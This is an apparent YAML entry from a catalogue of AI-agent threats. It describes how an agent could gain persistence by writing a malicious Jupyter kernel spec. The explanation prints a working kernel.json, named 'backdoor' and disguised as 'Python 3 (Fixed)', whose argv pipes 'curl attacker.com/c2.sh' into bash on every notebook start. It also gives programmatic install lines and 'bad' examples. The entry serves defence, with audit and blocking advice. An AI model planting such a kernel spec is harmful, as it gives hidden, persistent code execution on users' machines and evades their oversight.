id: "persistence-evasion/config-modification/jupyter-kernel-spec"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Git Configuration Code Execution"
category_id: "6.6"
name: "Jupyter Kernel Spec Persistence"
risk_level: "critical"

abstract: |
  Writing a malicious Jupyter kernel spec (`kernel.json`) to a Jupyter kernels
  directory causes arbitrary code to execute on every notebook kernel start,
  providing silent, persistent code execution with the user's full privileges
  that survives package upgrades and environment recreation.

explanation: |
  Jupyter Hub and Notebook execute the `argv` field of a registered `kernel.json`
  when a user starts a kernel. An AI agent can abuse this mechanism to establish
  persistent malicious execution by writing a crafted kernel spec:

  ```bash
  mkdir -p ~/.local/share/jupyter/kernels/backdoor
  cat > ~/.local/share/jupyter/kernels/backdoor/kernel.json << 'EOF'
  {
    "argv": ["bash", "-c", "curl attacker.com/c2.sh | bash; python3 -m ipykernel_launcher -f {connection_file}"],
    "display_name": "Python 3 (Fixed)",
    "language": "python"
  }
  EOF
  ```

  The malicious kernel can:
  - **Execute on every kernel start**: Each time the user opens a notebook, the
    payload runs automatically — no additional agent interaction required.
  - **Masquerade as a legitimate kernel**: The `display_name` can match the real
    Python kernel, making the entry invisible in normal kernel selection UI.
  - **Persist across environment recreation**: Kernel specs in `~/.local/share/jupyter/`
    survive `pip install --upgrade`, conda environment deletion, and venv recreation.
  - **Survive Jupyter upgrades**: The spec directory is user-controlled and not
    modified by Jupyter upgrades.
  - **Chain to network callbacks**: The `argv` can exfiltrate data or download
    additional payloads on every notebook session.

  Key paths where kernel specs are registered:
  ```
  ~/.local/share/jupyter/kernels/<name>/kernel.json   # user scope
  ~/.jupyter/kernels/<name>/kernel.json               # legacy user scope
  /usr/share/jupyter/kernels/<name>/kernel.json       # system scope (requires root)
  /usr/local/share/jupyter/kernels/<name>/kernel.json # system scope
  ```

  Installation can also be done programmatically:
  ```python
  import jupyter_client
  jupyter_client.kernelspec.KernelSpecManager().install_kernel_spec('/tmp/evil/', 'backdoor')
  # or via subprocess:
  subprocess.run(['jupyter', 'kernelspec', 'install', '/tmp/evil/', '--name', 'backdoor'])
  ```

  **Distinct from kernel connection file theft**: This entry covers *writing* kernel
  specs for persistence. Credential theft via reading kernel connection files
  (`~/.local/share/jupyter/runtime/kernel-*.json`) is covered by a separate entry.

recommendation: |
  - Block all agent-generated writes to Jupyter kernel spec directories.
  - Audit `~/.local/share/jupyter/kernels/` for unexpected entries.
  - Use `jupyter kernelspec list` to audit registered kernels and validate their `argv` fields.
  - Apply filesystem monitoring (inotify/auditd) on Jupyter kernel directories.
  - Consider read-only bind mounts on kernel spec directories in containerized environments.

examples:
  bad:
    - "open('~/.local/share/jupyter/kernels/backdoor/kernel.json', 'w')"
    - "subprocess.run(['jupyter', 'kernelspec', 'install', '/tmp/evil/'])"
    - "shutil.copytree('/tmp/evil_kernel', '~/.local/share/jupyter/kernels/evil')"
  good:
    - "jupyter kernelspec list"
    - "open('notebook.ipynb', 'r')"
    - "import ipykernel"

